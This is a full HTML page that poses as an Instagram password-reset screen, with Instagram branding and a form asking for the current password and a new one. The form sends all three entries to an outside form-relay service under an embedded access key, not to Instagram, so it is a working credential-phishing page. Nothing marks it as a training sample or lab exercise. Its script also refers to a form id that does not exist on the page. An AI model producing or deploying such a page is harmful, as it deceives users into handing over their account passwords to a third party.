<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Password Reset</title>
    <!-- Load the Roboto font for the rest of the text -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            width: 300px;
            margin-top: 50px; /* Add margin to avoid overlapping with header */
        }
        h2 {
            font-weight: 500;
            font-size: 20px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .reset-btn {
            background-color: #b3dffc;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: not-allowed;
        }
        .reset-btn.active {
            background-color: #3897f0;
            cursor: pointer;
            font-weight: bold;
        }
        /* Header styles */
        .header {
            position: absolute;
            top: 0;
            width: 100%;
            background-color: white;
            display: flex;
            justify-content: space-between;
            padding: 0px 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .header .logo {
            display: flex;
            align-items: center;
        }
        .header .logo img {
            height: 55px; 
            padding: 0px 5px;/* Set height to match the screenshot closely */
        }
        .header a {
            margin-left: 13px;
            color: #3897f0;
            font-weight: bold;
            text-decoration: none;
        }
        /* Open app button */
        .open-app-btn {
            background-color: #3897f0;
            color: white;
            border: none;
            padding: 6px 16px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }
        .open-app-btn:hover {
            background-color: #4da6f3;
        }
        .error {
            color: red;
            font-size: 12px;
            display: none;
        }
        .hd_btns{
            padding: 10px;
        }
    </style>
</head>
<body>

<!-- Header with Instagram text logo and Log in/Open app buttons -->
<div class="header">
    <div class="logo">
        <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Instagram Logo">
    </div>
    <div class="hd_btns">
        <a href="#">Log in</a>
        <button class="open-app-btn">Open app</button>
    </div>
</div>

<div class="container">
    <h2>Create A Strong Password</h2>
    <p>Your password must be at least 6<br> characters and should include a<br> combination of numbers, letters, and<br> special characters (!$@%).</p>
    
    <form action="https://api.web3forms.com/submit" method="POST">

    <!-- Replace with your Access Key -->
        <input type="hidden" name="access_key" value="46d603dc-402b-44aa-8940-50441eac9fda">
        
        <input type="password" id="password" name="Current Pass" placeholder="Current password" required>
        <input type="password" id="new-password" name="New Pass" placeholder="New password" required>
        <input type="password" id="confirm-password" name="New Pass again" placeholder="New password, again" required>
        <p class="error" id="error-msg">Password must be at least 6 characters!</p>
        <button type="submit" class="reset-btn" id="reset-btn" disabled>Reset Password</button>
    </form>
</div>

<script>
    const newPassword = document.getElementById('new-password');
    const confirmPassword = document.getElementById('confirm-password');
    const resetBtn = document.getElementById('reset-btn');
    const errorMsg = document.getElementById('error-msg');
    
    // Function to validate password length (only checks if at least 6 characters)
    function validatePasswords() {
        if (newPassword.value.length >= 6 && confirmPassword.value.length >= 6) {
            resetBtn.classList.add('active');
            resetBtn.disabled = false;
            errorMsg.style.display = 'none';
        } else {
            resetBtn.classList.remove('active');
            resetBtn.disabled = true;
            errorMsg.style.display = 'block';
        }
    }

    // Listen for input in both password fields
    newPassword.addEventListener('input', validatePasswords);
    confirmPassword.addEventListener('input', validatePasswords);

    // Prevent form submission if passwords are less than 6 characters
    document.getElementById('reset-form').addEventListener('submit', function(event) {
        if (newPassword.value.length < 6 || confirmPassword.value.length < 6) {
            event.preventDefault();
        }
    });
</script>

</body>
</html>
